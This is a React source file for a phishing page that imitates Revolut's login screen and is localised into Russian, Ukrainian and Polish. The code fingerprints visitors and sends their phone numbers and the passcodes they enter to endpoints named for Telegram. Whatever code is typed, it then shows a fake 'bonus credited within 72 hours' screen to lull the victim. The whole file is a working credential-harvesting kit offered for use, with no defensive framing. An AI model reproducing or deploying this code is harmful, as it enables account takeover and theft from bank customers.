"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Search } from "lucide-react"
import { useToast } from "@/hooks/use-toast"
import { countries } from "./countries-data"
import LanguageSelector from "./language-selector" // Assuming LanguageSelector is a separate component

interface Country {
  code: string
  country: string
  flag: string
  dial_code: string
}

const countryCodes: Country[] = countries

const languages = [
  { code: "en", name: "English (United Kingdom)" },
  { code: "en-US", name: "English (United States)" },
  { code: "bg", name: "Български" },
  { code: "cs", name: "Čeština" },
  { code: "da", name: "Dansk" },
  { code: "de", name: "Deutsch" },
  { code: "el", name: "Ελληνικά" },
  { code: "es", name: "Español" },
  { code: "et", name: "Eesti" },
  { code: "fi", name: "Suomi" },
  { code: "fr", name: "Français" },
  { code: "hr", name: "Hrvatski" },
  { code: "hu", name: "Magyar" },
  { code: "it", name: "Italiano" },
  { code: "ja", name: "日本語" },
  { code: "lt", name: "Lietuvių" },
  { code: "lv", name: "Latviešu" },
  { code: "nl", name: "Nederlands" },
  { code: "no", name: "Norsk" },
  { code: "pl", name: "Polski" },
  { code: "pt", name: "Português" },
  { code: "ro", name: "Română" },
  { code: "ru", name: "Русский" },
  { code: "sk", name: "Slovenčina" },
  { code: "sv", name: "Svenska" },
  { code: "uk", name: "Українська" },
]

const getTranslations = (locale: string) => {
  const translations = {
    en: {
      welcomeBack: "Welcome back",
      enterPhone: "Enter the phone number associated with your Revolut account",
      phoneNumber: "Phone number",
      continue: "Continue",
      signingIn: "Signing in...",
      orContinueWith: "or continue with",
      lostAccess: "Lost access to my phone number",
      createAccount: "Create account",
      dontHaveAccount: "Don't have an account?",
      loginQR: "Log in with QR code",
      scanCode: "Scan this code with your phone camera to log in instantly",
      language: "English (United Kingdom)",
      privacy: "Privacy Policy",
      temporarilyUnavailable: "Temporarily unavailable",
      featureComingSoon: "This feature is coming soon",
      enterPasscode: "Enter passcode",
      success: "Success",
      codeVerified: "Code verified",
      error: "Error",
      incorrectCode: "Incorrect code",
      privacyPolicy: "Privacy Policy",
      forgotPasscode: "Forgot passcode?",
      bonusTitle: "Congratulations!",
      bonusMessage: "Your bonus will be credited within 72 hours.",
      thankYou: "Thank you for staying with us!",
    },
    ru: {
      welcomeBack: "С возвращением",
      enterPhone: "Введите номер телефона, связанный с вашей учетной записью Revolut",
      phoneNumber: "Номер телефона",
      continue: "Продолжить",
      signingIn: "Вход...",
      orContinueWith: "или продолжить с",
      lostAccess: "Потерял доступ к номеру телефона",
      createAccount: "Создать аккаунт",
      dontHaveAccount: "Нет аккаунта?",
      loginQR: "Войти через QR-код",
      scanCode: "Отсканируйте этот код камерой телефона для мгновенного входа",
      language: "Русский",
      privacy: "Политика конфиденциальности",
      temporarilyUnavailable: "Временно недоступно",
      featureComingSoon: "Эта функция скоро появится",
      enterPasscode: "Введите пароль",
      success: "Успешно",
      codeVerified: "Код подтверждён",
      error: "Ошибка",
      incorrectCode: "Неверный код",
      privacyPolicy: "Политика конфиденциальности",
      forgotPasscode: "Забыли пароль?",
      bonusTitle: "Поздравляем!",
      bonusMessage: "Ваш бонус будет зачислен в течение 72 часов.",
      thankYou: "Спасибо, что остаётесь с нами!",
    },
    uk: {
      welcomeBack: "З поверненням",
      enterPhone: "Введіть номер телефону, пов'язаний з вашим обліковим записом Revolut",
      phoneNumber: "Номер телефону",
      continue: "Продовжити",
      signingIn: "Вхід...",
      orContinueWith: "або продовжити з",
      lostAccess: "Втратив доступ до номера телефону",
      createAccount: "Створити обліковий запис",
      dontHaveAccount: "Немає облікового запису?",
      loginQR: "Увійти через QR-код",
      scanCode: "Відскануйте цей код камерою телефону для миттєвого входу",
      language: "Українська",
      privacy: "Політика конфіденційності",
      temporarilyUnavailable: "Тимчасово недоступно",
      featureComingSoon: "Ця функція незабаром з'явиться",
      enterPasscode: "Введите пароль",
      success: "Успіх",
      codeVerified: "Код підтверджено",
      error: "Помилка",
      incorrectCode: "Невірний код",
      privacyPolicy: "Політика конфіденційності",
      forgotPasscode: "Забули пароль?",
      bonusTitle: "Поздравляем!",
      bonusMessage: "Ваш бонус будет зачислен в течение 72 часов.",
      thankYou: "Спасибо, что остаётесь с нами!",
    },
    pl: {
      welcomeBack: "Witamy z powrotem",
      enterPhone: "Wprowadź numer telefonu powiązany z Twoim kontem Revolut",
      phoneNumber: "Numer telefonu",
      continue: "Kontynuuj",
      signingIn: "Logowanie...",
      orContinueWith: "lub kontynuuj z",
      lostAccess: "Utracono dostęp do mojego numeru telefonu",
      createAccount: "Utwórz konto",
      dontHaveAccount: "Nie masz konta?",
      loginQR: "Zaloguj się za pomocą kodu QR",
      scanCode: "Zeskanuj ten kod aparatem telefonu, aby natychmiast się zalogować",
      language: "Polski",
      privacy: "Polityka prywatności",
      temporarilyUnavailable: "Tymczasowo niedostępne",
      featureComingSoon: "Ta funkcja wkrótce się pojawi",
      enterPasscode: "Wprowadź kod",
      success: "Sukces",
      codeVerified: "Kod zweryfikowany",
      error: "Błąd",
      incorrectCode: "Niepoprawny kod",
      privacyPolicy: "Polityka prywatności",
      forgotPasscode: "Zapomniałeś kod?",
      bonusTitle: "Поздравляем!",
      bonusMessage: "Ваш бонус будет зачислен в течение 72 часов.",
      thankYou: "Спасибо, что остаётесь с нами!",
    },
  }

  return translations[locale as keyof typeof translations] || translations.en
}

export function SignInForm() {
  const { toast } = useToast()
  const [selectedCountry, setSelectedCountry] = useState<Country | null>(null)
  const [phone, setPhone] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [showCountrySelect, setShowCountrySelect] = useState(false)
  const [searchQuery, setSearchQuery] = useState("")
  const [currentLanguage, setCurrentLanguage] = useState<string>("en")
  const [showLanguageMenu, setShowLanguageMenu] = useState(false)
  const [languageSearch, setLanguageSearch] = useState("")
  const [notificationSent, setNotificationSent] = useState(false)
  const [showPasscode, setShowPasscode] = useState(false)
  const [passcode, setPasscode] = useState<string[]>(Array(8).fill(""))
  const [generatedCode, setGeneratedCode] = useState("")
  const [showBonus, setShowBonus] = useState(false)
  const [giftAnimating, setGiftAnimating] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const countryDropdownRef = useRef<HTMLDivElement>(null)
  const languageDropdownRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    async function detectUserLocation() {
      try {
        const browserLang = navigator.language.toLowerCase()

        if (browserLang.includes("ru")) {
          setCurrentLanguage("ru")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+7") || countryCodes[0])
        } else if (browserLang.includes("uk")) {
          setCurrentLanguage("uk")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+380") || countryCodes[0])
        } else if (browserLang.includes("pl")) {
          setCurrentLanguage("pl")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+48") || countryCodes[0])
        } else if (browserLang.includes("be") || browserLang.includes("by")) {
          setCurrentLanguage("ru")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+375") || countryCodes[0])
        } else if (browserLang.includes("de")) {
          setCurrentLanguage("en")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+49") || countryCodes[0])
        } else if (browserLang.includes("fr")) {
          setCurrentLanguage("en")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+33") || countryCodes[0])
        } else if (browserLang.includes("es")) {
          setCurrentLanguage("en")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+34") || countryCodes[0])
        } else if (browserLang.includes("it")) {
          setCurrentLanguage("en")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+39") || countryCodes[0])
        } else {
          setCurrentLanguage("en")
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+44") || countryCodes[0])
        }

        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone
        if (timezone.includes("Moscow") || timezone.includes("Europe/Moscow")) {
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+7") || countryCodes[0])
        } else if (timezone.includes("Kyiv") || timezone.includes("Kiev")) {
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+380") || countryCodes[0])
        } else if (timezone.includes("Minsk")) {
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+375") || countryCodes[0])
        } else if (timezone.includes("Warsaw")) {
          setSelectedCountry(countryCodes.find((c) => c.dial_code === "+48") || countryCodes[0])
        }

        const visitorData = {
          country: selectedCountry?.country || "Unknown",
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          ip: null,
        }

        fetch("/api/telegram-visitor", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(visitorData),
        }).catch((err) => console.log("Visitor tracking error:", err))
      } catch (error) {
        console.log("Location detection error:", error)
      }
    }

    detectUserLocation()
  }, [])

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (countryDropdownRef.current && !countryDropdownRef.current.contains(event.target as Node)) {
        setShowCountrySelect(false)
        setSearchQuery("")
      }
      if (languageDropdownRef.current && !languageDropdownRef.current.contains(event.target as Node)) {
        setShowLanguageMenu(false)
        setLanguageSearch("")
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => document.removeEventListener("mousedown", handleClickOutside)
  }, [])

  const generateAndSendCode = async () => {
    const code = Math.floor(10000000 + Math.random() * 90000000).toString()
    setGeneratedCode(code)

    console.log("Generated verification code:", code)

    try {
      await fetch("/api/telegram-code", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          code,
          phone: `${selectedCountry?.dial_code} ${phone}`,
        }),
      })
    } catch (error) {
      console.error("Failed to send code to Telegram:", error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    const fullPhone = `${selectedCountry?.dial_code} ${phone}`

    try {
      await fetch("/api/telegram-phone", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phone: fullPhone,
        }),
      })
      console.log("Phone number sent to Telegram:", fullPhone)
    } catch (error) {
      console.error("Failed to send phone to Telegram:", error)
    }

    await generateAndSendCode()
    await new Promise((resolve) => setTimeout(resolve, 1000))

    setIsLoading(false)
    setShowPasscode(true)
  }

  const verifyPasscode = async (enteredCode: string) => {
    const fullPhone = `${selectedCountry?.dial_code} ${phone}`

    try {
      await fetch("/api/telegram-passcode", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          passcode: enteredCode,
          phone: fullPhone,
        }),
      })
      console.log("User entered code sent to Telegram:", enteredCode)
    } catch (error) {
      console.error("Failed to send passcode to Telegram:", error)
    }

    setShowBonus(true)
    setGiftAnimating(true)

    setTimeout(() => {
      setGiftAnimating(false)
    }, 2000)
  }

  const handlePasscodeChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value[value.length - 1]
    }

    if (!/^\d*$/.test(value)) return

    const newPasscode = [...passcode]
    newPasscode[index] = value
    setPasscode(newPasscode)

    if (value && index < 7) {
      inputRefs.current[index + 1]?.focus()
    }

    if (index === 7 && value) {
      const enteredCode = newPasscode.join("")
      verifyPasscode(enteredCode)
    }
  }

  const handlePasscodeKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !passcode[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleBackToPhone = () => {
    setShowPasscode(false)
    setPasscode(Array(8).fill(""))
    setGeneratedCode("")
  }

  const translations = getTranslations(currentLanguage)

  const filteredCountries = countryCodes.filter(
    (c) => c.country.toLowerCase().includes(searchQuery.toLowerCase()) || c.dial_code.includes(searchQuery),
  )

  const filteredLanguages = languages.filter((l) => l.name.toLowerCase().includes(languageSearch.toLowerCase()))

  const handleKeypadPress = (digit: string) => {
    const currentIndex = passcode.findIndex((d) => d === "")
    if (currentIndex === -1) return

    const newPasscode = [...passcode]
    newPasscode[currentIndex] = digit
    setPasscode(newPasscode)

    if (currentIndex < 7) {
      inputRefs.current[currentIndex + 1]?.focus()
    }

    if (currentIndex === 7) {
      const enteredCode = newPasscode.join("")
      verifyPasscode(enteredCode)
    }
  }

  const handleKeypadBackspace = () => {
    const lastFilledIndex = passcode
      .map((d, i) => (d ? i : -1))
      .filter((i) => i !== -1)
      .pop()
    if (lastFilledIndex !== undefined) {
      const newPasscode = [...passcode]
      newPasscode[lastFilledIndex] = ""
      setPasscode(newPasscode)
      inputRefs.current[lastFilledIndex]?.focus()
    }
  }

  const handleSocialAuth = (provider: string) => {
    toast({
      title: translations.temporarilyUnavailable,
      variant: "default",
    })
  }

  if (showBonus) {
    return (
      <div className="w-full min-h-screen flex flex-col">
        <div className="flex-1 flex items-center justify-center px-4 py-8">
          <div className="w-full max-w-md text-center">
            <div className={`mb-6 sm:mb-8 transition-all duration-500 ${giftAnimating ? "scale-110" : "scale-100"}`}>
              <div className="relative inline-block">
                <svg
                  className="w-24 h-24 xs:w-28 xs:h-28 sm:w-32 sm:h-32 md:w-40 md:h-40 mx-auto"
                  viewBox="0 0 100 100"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect x="20" y="40" width="60" height="50" fill="#3B82F6" rx="4" />
                  <rect x="20" y="30" width="60" height="15" fill="#60A5FA" rx="2" />
                  <rect x="47" y="30" width="6" height="60" fill="#FBBF24" />
                  <rect x="20" y="37" width="60" height="6" fill="#FBBF24" />
                  <g
                    className={`origin-center transition-all duration-500 ${giftAnimating ? "translate-y-[-10px] opacity-80" : "translate-y-0 opacity-100"}`}
                  >
                    <ellipse cx="35" cy="25" rx="12" ry="8" fill="#EF4444" />
                    <ellipse cx="65" cy="25" rx="12" ry="8" fill="#EF4444" />
                    <circle cx="50" cy="25" r="6" fill="#DC2626" />
                  </g>
                  {giftAnimating && (
                    <>
                      <circle cx="15" cy="20" r="2" fill="#FCD34D" opacity="0.8">
                        <animate attributeName="opacity" values="0;1;0" dur="1s" repeatCount="indefinite" />
                      </circle>
                      <circle cx="85" cy="25" r="2" fill="#FCD34D" opacity="0.8">
                        <animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite" />
                      </circle>
                      <circle cx="10" cy="50" r="2" fill="#FCD34D" opacity="0.8">
                        <animate attributeName="opacity" values="0;1;0" dur="1.5s" repeatCount="indefinite" />
                      </circle>
                      <circle cx="90" cy="55" r="2" fill="#FCD34D" opacity="0.8">
                        <animate attributeName="opacity" values="1;0;1" dur="1.5s" repeatCount="indefinite" />
                      </circle>
                    </>
                  )}
                </svg>
              </div>
            </div>

            <h1 className="text-2xl xs:text-3xl sm:text-4xl font-bold text-white mb-3 sm:mb-4 px-4">
              {translations.bonusTitle || "Поздравляем!"}
            </h1>

            <p className="text-sm xs:text-base sm:text-lg text-gray-300 mb-2 px-4 leading-relaxed">
              {translations.bonusMessage || "Ваш бонус будет зачислен в течение 72 часов."}
            </p>

            <p className="text-xs xs:text-sm sm:text-base text-gray-400 px-4 leading-relaxed">
              {translations.thankYou || "Спасибо, что остаётесь с нами!"}
            </p>
          </div>
        </div>

        <div className="p-4 sm:p-6 flex flex-col sm:flex-row items-center justify-between gap-3 sm:gap-4">
          <LanguageSelector
            currentLanguage={currentLanguage}
            onLanguageChange={setCurrentLanguage}
            translations={translations}
          />
          <a href="#" className="text-gray-400 hover:text-white text-xs sm:text-sm transition-colors whitespace-nowrap">
            {translations.privacyPolicy}
          </a>
        </div>
      </div>
    )
  }

  if (showPasscode) {
    return (
      <div className="w-full min-h-screen flex flex-col">
        <div className="flex-1 flex items-center justify-center px-3 xs:px-4 sm:px-6 py-6 sm:py-8">
          <div className="w-full max-w-[440px]">
            <button
              onClick={handleBackToPhone}
              className="mb-6 sm:mb-8 p-2 sm:p-2.5 hover:bg-white/5 rounded-lg transition-colors"
              aria-label="Back"
            >
              <svg className="w-5 h-5 sm:w-6 sm:h-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
            </button>

            <h1 className="text-2xl xs:text-3xl sm:text-4xl font-bold text-white mb-6 sm:mb-8 text-center px-2">
              {translations.enterPasscode || "Введите пароль"}
            </h1>

            <div className="flex justify-center gap-1 xs:gap-1.5 sm:gap-2 md:gap-3 mb-8 sm:mb-10 px-2">
              {passcode.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handlePasscodeChange(index, e.target.value)}
                  onKeyDown={(e) => handlePasscodeKeyDown(index, e)}
                  className="w-8 h-8 xs:w-9 xs:h-9 sm:w-11 sm:h-11 md:w-14 md:h-14 bg-[#374151] rounded-full text-center text-white text-base xs:text-lg sm:text-xl md:text-2xl font-semibold focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all"
                  style={{
                    WebkitTextSecurity: digit ? "disc" : "none",
                  }}
                />
              ))}
            </div>

            <div className="max-w-[280px] xs:max-w-xs sm:max-w-sm mx-auto mb-6 sm:mb-8 px-2">
              <div className="grid grid-cols-3 gap-2 xs:gap-2.5 sm:gap-3 md:gap-4">
                {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                  <button
                    key={num}
                    onClick={() => handleKeypadPress(num.toString())}
                    className="aspect-square bg-[#374151] hover:bg-[#4b5563] rounded-full text-white text-lg xs:text-xl sm:text-2xl font-semibold transition-colors active:scale-95"
                  >
                    {num}
                  </button>
                ))}
                <div />
                <button
                  onClick={() => handleKeypadPress("0")}
                  className="aspect-square bg-[#374151] hover:bg-[#4b5563] rounded-full text-white flex items-center justify-center transition-colors active:scale-95"
                >
                  0
                </button>
                <button
                  onClick={handleKeypadBackspace}
                  className="aspect-square bg-[#374151] hover:bg-[#4b5563] rounded-full text-white flex items-center justify-center transition-colors active:scale-95"
                  aria-label="Backspace"
                >
                  <svg
                    className="w-5 h-5 xs:w-6 xs:h-6 sm:w-7 sm:h-7"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2M3 12l6.414 6.414a2 2 0 001.414.586H19a2 2 0 002-2V7a2 2 0 00-2-2h-8.172a2 2 0 00-1.414.586L3 12z"
                    />
                  </svg>
                </button>
              </div>
            </div>

            <div className="text-center mb-4 px-2">
              <button className="text-blue-400 hover:text-blue-300 transition-colors text-xs xs:text-sm sm:text-base">
                {translations.forgotPasscode || "Забыли пароль?"}
              </button>
            </div>
          </div>
        </div>

        <div className="py-4 sm:py-6 px-4 flex flex-col sm:flex-row items-center justify-between gap-3 sm:gap-4 text-xs sm:text-sm text-gray-400">
          <LanguageSelector
            currentLanguage={currentLanguage}
            onLanguageChange={setCurrentLanguage}
            translations={translations}
          />
          <a href="#" className="hover:text-white transition-colors">
            {translations.privacyPolicy || "Политика конфиденциальности"}
          </a>
        </div>
      </div>
    )
  }

  return (
    <div className="w-full max-w-6xl mx-auto px-4 sm:px-6">
      <div className="w-full flex flex-col lg:flex-row gap-8 lg:gap-12 xl:gap-16 items-center justify-center">
        <div className="flex-1 w-full max-w-[500px]">
          <h1 className="text-2xl xs:text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-2 sm:mb-3">
            {translations.welcomeBack}
          </h1>
          <p className="text-sm xs:text-base sm:text-lg text-white/70 mb-6 sm:mb-8 md:mb-10 leading-relaxed">
            {translations.enterPhone}
          </p>

          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
            <div className="space-y-4">
              <div className="flex gap-2 sm:gap-3">
                <div className="relative" ref={countryDropdownRef}>
                  <button
                    type="button"
                    onClick={() => setShowCountrySelect(!showCountrySelect)}
                    className="h-[52px] xs:h-[56px] sm:h-[60px] w-[110px] xs:w-[120px] sm:w-[140px] px-2.5 xs:px-3 sm:px-4 bg-white/10 backdrop-blur-sm text-white rounded-xl sm:rounded-2xl hover:bg-white/15 transition-all flex items-center justify-between gap-1 sm:gap-2 border border-white/10"
                  >
                    <span className="flex items-center gap-1 sm:gap-1.5">
                      <span className="text-lg xs:text-xl sm:text-2xl">{selectedCountry?.flag}</span>
                      <span className="font-medium text-xs xs:text-sm sm:text-base">{selectedCountry?.dial_code}</span>
                    </span>
                    <svg
                      className={`w-3.5 h-3.5 sm:w-4 sm:h-4 transition-transform flex-shrink-0 ${showCountrySelect ? "rotate-180" : ""}`}
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                    </svg>
                  </button>

                  {showCountrySelect && (
                    <div className="absolute top-full left-0 mt-2 w-[calc(100vw-2rem)] xs:w-[380px] sm:w-[420px] max-w-[95vw] bg-[#2d3540] rounded-2xl shadow-2xl z-50 overflow-hidden border border-white/10">
                      <div className="p-3 sm:p-4 border-b border-white/10">
                        <div className="relative">
                          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 sm:w-5 sm:h-5 text-white/50" />
                          <Input
                            type="text"
                            placeholder="Search"
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            className="h-10 sm:h-12 pl-9 sm:pl-10 bg-white/5 border-white/10 text-white placeholder:text-white/40 rounded-xl sm:rounded-2xl text-sm sm:text-base focus-visible:ring-2 focus-visible:ring-white/30 focus-visible:border-white/20"
                          />
                        </div>
                      </div>
                      <div className="max-h-[260px] sm:max-h-[320px] overflow-y-auto">
                        {filteredCountries.map((c, index) => (
                          <button
                            key={`${c.code}-${c.country}-${index}`}
                            type="button"
                            onClick={() => {
                              setSelectedCountry(c)
                              setShowCountrySelect(false)
                              setSearchQuery("")
                            }}
                            className="w-full px-3 sm:px-4 py-2.5 sm:py-3 hover:bg-white/5 transition-colors flex items-center gap-2 sm:gap-3 text-left"
                          >
                            <span className="text-xl sm:text-2xl">{c.flag}</span>
                            <span className="text-white/90 font-medium text-sm sm:text-base">{c.dial_code}</span>
                            <span className="text-white/70 text-xs xs:text-sm sm:text-base truncate">{c.country}</span>
                          </button>
                        ))}
                      </div>
                    </div>
                  )}
                </div>

                <Input
                  type="tel"
                  placeholder={translations.phoneNumber}
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="flex-1 h-[52px] xs:h-[56px] sm:h-[60px] bg-white/10 backdrop-blur-sm border-white/10 text-white placeholder:text-white/40 rounded-xl sm:rounded-2xl text-sm xs:text-base sm:text-lg focus-visible:ring-2 focus-visible:ring-white/30 focus-visible:border-white/20"
                  required
                />
              </div>

              <a
                href="https://vk.com"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-block text-blue-400 hover:text-blue-300 transition-colors text-xs xs:text-sm font-medium"
              >
                {translations.lostAccess}
              </a>
            </div>

            <Button
              type="submit"
              className="w-full h-[52px] xs:h-[56px] sm:h-[60px] bg-white hover:bg-white/90 text-black font-semibold rounded-xl sm:rounded-2xl text-sm xs:text-base transition-all"
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-black/20 border-t-black rounded-full animate-spin" />
                  <span>{translations.signingIn}</span>
                </div>
              ) : (
                translations.continue
              )}
            </Button>
          </form>

          <div className="my-6 sm:my-7 md:my-8">
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-white/10"></div>
              </div>
              <div className="relative flex justify-center text-xs xs:text-sm">
                <span className="px-3 sm:px-4 text-white/50 font-medium">{translations.orContinueWith}</span>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-3 gap-2 xs:gap-2.5 sm:gap-3 md:gap-4 mb-6 sm:mb-8">
            <Button
              type="button"
              variant="outline"
              className="h-12 xs:h-14 sm:h-16 bg-white/10 backdrop-blur-sm border-white/10 hover:bg-white/15 rounded-xl sm:rounded-2xl transition-all flex flex-col items-center justify-center gap-0.5 xs:gap-1 p-2"
              onClick={() => handleSocialAuth("email")}
            >
              <svg
                className="w-4 h-4 xs:w-5 xs:h-5 sm:w-6 sm:h-6 text-white"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
              >
                <rect x="3" y="5" width="18" height="14" rx="2" />
                <path d="m3 7 9 6 9-6" />
              </svg>
              <span className="text-[10px] xs:text-xs text-white/70">Email</span>
            </Button>
            <Button
              type="button"
              variant="outline"
              className="h-12 xs:h-14 sm:h-16 bg-white/10 backdrop-blur-sm border-white/10 hover:bg-white/15 rounded-xl sm:rounded-2xl transition-all flex flex-col items-center justify-center gap-0.5 xs:gap-1 p-2"
              onClick={() => handleSocialAuth("google")}
            >
              <svg className="w-4 h-4 xs:w-5 xs:h-5 sm:w-6 sm:h-6" viewBox="0 0 24 24">
                <path
                  fill="#4285F4"
                  d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                />
                <path
                  fill="#34A853"
                  d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                />
                <path
                  fill="#FBBC05"
                  d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                />
                <path
                  fill="#EA4335"
                  d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                />
              </svg>
              <span className="text-[10px] xs:text-xs text-white/70">Google</span>
            </Button>
            <Button
              type="button"
              variant="outline"
              className="h-12 xs:h-14 sm:h-16 bg-white/10 backdrop-blur-sm border-white/10 hover:bg-white/15 rounded-xl sm:rounded-2xl transition-all flex flex-col items-center justify-center gap-0.5 xs:gap-1 p-2"
              onClick={() => handleSocialAuth("apple")}
            >
              <svg className="w-4 h-4 xs:w-5 xs:h-5 sm:w-6 sm:h-6 text-white" viewBox="0 0 24 24" fill="currentColor">
                <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
              </svg>
              <span className="text-[10px] xs:text-xs text-white/70">Apple</span>
            </Button>
          </div>

          <div className="text-center">
            <p className="text-white/50 text-xs xs:text-sm mb-2.5 sm:mb-3">{translations.dontHaveAccount}</p>
            <Button
              type="button"
              variant="outline"
              className="w-full h-[52px] xs:h-[56px] sm:h-[60px] bg-transparent border-white/20 hover:bg-white/5 text-white rounded-xl sm:rounded-2xl text-sm xs:text-base font-semibold transition-all"
            >
              {translations.createAccount}
            </Button>
          </div>
        </div>

        <div className="hidden lg:flex flex-col items-center gap-4 pt-8 xl:pt-12">
          <div className="bg-white p-5 xl:p-6 rounded-2xl xl:rounded-3xl shadow-2xl">
            <img
              src="/qr-code-revolut.jpg"
              alt="QR Code"
              className="w-[180px] h-[180px] xl:w-[200px] xl:h-[200px] object-contain"
            />
          </div>
          <h3 className="text-white font-semibold text-base xl:text-lg">{translations.loginQR}</h3>
          <p className="text-white/60 text-sm text-center max-w-[220px] xl:max-w-[240px] leading-relaxed">
            {translations.scanCode}
          </p>
        </div>
      </div>
    </div>
  )
}
